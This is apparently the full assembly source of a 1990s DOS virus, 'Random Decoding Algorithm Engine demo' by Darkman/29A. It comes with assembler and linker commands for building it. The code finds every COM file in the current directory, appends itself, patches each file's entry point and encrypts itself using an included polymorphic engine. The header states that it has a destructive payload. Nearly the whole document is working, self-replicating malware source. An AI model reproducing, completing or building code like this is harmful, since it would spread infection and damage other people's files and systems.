   ; comment *
   ;        Random Decoding Algorithm Engine demo
   ;               Code by
   ;                 Darkman/29A
   ;
   ;   Random Decoding Algorithm Engine demo is a 866 bytes direct action appending
   ;   COM virus, infects every file in current diretory. Random Decoding Algorithm
   ;   Engine demo has an error handler and is using the Random Decoding Algorithm
   ;   Engine v 1.00 [RDAE]. Random Decoding Algorithm demo has a destructive
   ;   payload.
   ;
   ;   Compile Random Decoding Algorithm E... with Turbo Assembler v 5.0 by typing:
   ;     TASM /M RDAEDEMO.ASM
   ;     TLINK /x RDAEDEMO.OBJ
   ;     EXE2BIN RDAEDEMO.EXE RDAEDEMO.COM
   ; *

   .model tiny
   .code

   code_begin:
            cld             ; Clear direction flag
            mov     cx,05h      ; CX = length of encrypted code
            lea     si,[bp+origin_code] ; SI = offset of origin_code
            push    si          ; Save SI at stack
   call_imm16   equ     word ptr $+01h  ; Offset of CALL imm16
            call    first_gen
   restore_code:
            pop     si          ; Load SI from stack
            mov     di,100h         ; DI = offset of beginning of code
            push    di          ; Save DI at stack
            movsw           ; Move the original code to beginning
            movsw           ;  "    "     "      "   "      "
            movsb           ;  "    "     "      "   "      "

            mov     ax,3524h        ; Get interrupt vector 24h
            int     21h
            push    bx es       ; Save registers at stack

            push    cs          ; Save CS at stack
            pop     es          ; Load ES from stack (CS)

            mov     ah,25h      ; Set interrupt vector 24h
            lea     dx,[bp+int24_virus] ; DX = offset of int24_virus
            int     21h
            push    ax          ; Save AX at stack

            mov     ah,1ah      ; Set Disk Transfer Area address
            lea     dx,[bp+dta]     ; DX = offset of dta
            int     21h

            mov     ah,4eh      ; Find first matching file (DTA)
            mov     cl,00100110b    ; CL = file attribute mask
            sub     dx,(dta-file_specifi)
   find_next:
            int     21h
            jnc     infect_file     ; No error? Jump to infect_file
   virus_exit:
            mov     ah,1ah      ; Set disk transfer area address
            mov     dx,80h      ; DX = offset of default DTA
            int     21h

            pop     ax          ; Load AX from stack
            pop     es bx       ; Load registers from stack
            int     21h

            push    cs          ; Save CS at stack
            pop     es          ; Load ES from stack (CS)

            xor     ax,ax       ; Zero AX
            mov     bx,ax       ;  "   BX
            mov     cx,ax       ;  "   CX
            cwd             ;  "   DX
            mov     di,ax       ;  "   DI
            mov     si,ax       ;  "   SI
            mov     bp,ax       ;  "   BP

            ret             ; Return
   infect_file:
            mov     ax,3d02h        ; Open file (read/write)
            lea     dx,[bp+filename]    ; DX = offset of filename
            int     21h
            xchg    ax,bx       ; BX = file handle
            jc      close_file      ; Error? Jump to close_file

            mov     ah,3fh      ; Read from file
            mov     cx,05h      ; Read five bytes
            sub     dx,(filename-origin_code)
            int     21h

            mov     si,dx       ; SI = offset of origin_code
            mov     ax,[si]         ; AX = two bytes of origin_code
            cmp     al,10111101b    ; MOV BP,imm16 (opcode 0bdh)?
            je      close_file      ; Already infected? Jump to close_...

            xor     ax,'MZ'             ; EXE signature?
            jz      close_file      ; Zero? Jump to close_file
            xor     ax,('ZM' xor 'MZ')  ; EXE signature?
            jz      close_file      ; Zero? Jump to close_file

            mov     ax,4202h        ; Set current file position (EOF)
            cwd             ; Zero DX
            mov     cx,dx       ;  "   CX
            int     21h

            cmp     ax,(code_end-code_begin)*02h
            jb      close_file      ; Below? Jump to close_file
            cmp     ax,0fefeh-(data_end-code_begin)
            jbe     get_sys_time    ; Below or equal? Jump to get_sys_...
   close_file:
            mov     ah,3eh      ; Close file
            int     21h

            mov     ah,4fh      ; Find next matching file (DTA)
            jmp     find_next
   get_sys_time:
            add     ax,100h         ; Add offset of beginning of code ...
            mov     [bp+virus_offset],ax

            mov     ah,2ch      ; Get system time
            int     21h

            mov     al,00000001b    ; AL = flags

            cmp     ch,04h      ; 4.00am?
            jne     write_file      ; Below? Jump to write_file

            inc     ax          ; AL = flags

            cmp     cl,28h      ; 4.40am?
            jb      write_file      ; Above? Jump to write_file

            inc     ax          ; AL = flags
   write_file:
            push    bx          ; Save BX at stack
            mov     cx,05h      ; CX = length of original code
            call    rdae_encrypt
            pop     bx          ; Load BX from stack

            mov     ah,40h      ; Write to file
            mov     cx,(code_end-code_begin)
            mov     dx,bp       ; DX = delta offset
            int     21h
            cmp     ax,cx       ; Written all of the virus?
            jne     close_file_     ; Not equal? Jump to close_file_

            mov     ax,4200h        ; Set current file position (SOF)
            cwd             ; Zero DX
            mov     cx,dx       ;  "   CX
            int     21h

            mov     ah,40h      ; Write to file
            mov     cl,05h      ; Write five bytes
            lea     dx,[bp+infect_code] ; DX = offset of infect_code
            int     21h
   close_file_:
            mov     ax,5701h        ; Set file's data and time
            mov     cx,[bp+file_time]   ; CX = file's time
            mov     dx,[bp+file_date]   ; DX = file's date
            int     21h

            jmp     close_file

   int24_virus  proc    near        ; Interrupt 24h of Random Decoding...
            mov     al,03h      ; Fail system call in progress

            iret            ; Interrupt return
            endp
   infect_code:
   virus_offset equ     word ptr $+01h  ; Offset of virus within infected ...
            mov     bp,00h      ; BP = delta offset

            jmp     bp

   include      rdae.asm            ; Include Random Decoding Algorith...
   file_specifi db      '*.COM',00h         ; File specification
   origin_code  db      11001101b,00100000b,?,?,?,?
            db      '[Random Decoding Algorithm Engine demo] '
            db      '[Darkman/29A]'     ; Author of the virus
   code_end:
   dta:
            db      15h dup(?)      ; Used by DOS for find next-process
   file_attr    db      ?           ; File attribute
   file_time    dw      ?           ; File time
   file_date    dw      ?           ; File date
   filesize     dd      ?           ; Filesize
   filename     db      0dh dup(?)      ; Filename

   include      rdae.inc            ; Include Random Decoding Algorith...
   data_end:
   first_gen:
            pop     bx ax       ; Load registers from stack

            std             ; Set direction flag
            mov     cx,(code_end-code_begin)
            lea     di,code_end+105h-01h
            lea     si,code_end+105h-06h
            rep     movsb       ; Move virus to delta offset

            cld             ; Clear direction flag
            lea     ax,[origin_code+105h]
            lea     bx,[restore_code+105h]
            mov     bp,105h         ; BP = delta offset
            mov     [call_imm16+105h],(rdae_decrypt-restore_code)

            push    ax bx       ; Save registers at stack

            ret             ; Return

   end      code_begin
